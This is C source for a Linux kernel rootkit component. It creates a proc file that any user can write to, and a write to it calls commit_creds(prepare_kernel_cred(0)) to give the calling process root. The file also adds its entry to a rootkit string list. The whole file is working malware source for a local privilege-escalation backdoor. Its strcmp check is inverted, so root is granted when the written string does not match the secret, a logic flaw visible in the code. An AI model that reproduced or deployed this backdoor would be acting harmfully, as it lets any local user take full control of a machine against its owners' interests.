#include <linux/seq_file.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/cred.h>
#include "priv_escalate.h" 
#include "rootkit_strings.h"

// Buffer save user input
static char priv_escalate_proc_file_data[PRIV_ESCALATE_FILE_BUFF_SIZE];


void escalate_process_root(void) {
    commit_creds(prepare_kernel_cred (0));
}

static int priv_escalate_proc_file_show(struct seq_file *m, void *v) {
    seq_printf(m, "%s\n", priv_escalate_proc_file_data);
    return 0;
}


static int priv_escalate_proc_file_open(struct inode *inode_ptr, struct file *fp) {
    return single_open(fp, priv_escalate_proc_file_show, PDE_DATA(inode_ptr));
}


ssize_t priv_escalate_proc_file_write(struct file *file, const char *buf, size_t count, loff_t *data) {
    if(count > PRIV_ESCALATE_FILE_BUFF_SIZE) {
       count = PRIV_ESCALATE_FILE_BUFF_SIZE; 
    }

    if(copy_from_user(priv_escalate_proc_file_data, buf, count)) {
        return -EFAULT;
    }

    // If the privilege escalation string is found upgrade the calling process to root
    if (strcmp(priv_escalate_proc_file_data, PRIV_ESCALATE_STRING)) {
        escalate_process_root();
    } 

    return count;
}

static const struct file_operations priv_escalate_proc_file_fops = {
    .open = priv_escalate_proc_file_open,
    .read = seq_read,
    .write = priv_escalate_proc_file_write,
    .llseek = seq_lseek,
    .release = single_release,
};


int init_priv_escalate_proc_file(void){
    // Zero out input buf
    memset(priv_escalate_proc_file_data, 0, PRIV_ESCALATE_FILE_BUFF_SIZE);
    
    // Set default value of input buf
    memset(priv_escalate_proc_file_data, 0x30, 1);  
    
    // Create proc path with read and write permissions for everyone 
    if(!proc_create(PRIV_ESCALATE_PROC_PATH, S_IRUGO | S_IWUGO, NULL, &priv_escalate_proc_file_fops)) {
       printk(KERN_ERR "Unable to create proc path: %s \n", PRIV_ESCALATE_PROC_PATH);
       return -ENOENT; 
    }

    add_rootkit_fs_string(PRIV_ESCALATE_PROC_FILE);

    return 0;
}


void cleanup_priv_escalate_proc_file(void){
    remove_proc_entry(PRIV_ESCALATE_PROC_PATH, NULL);
}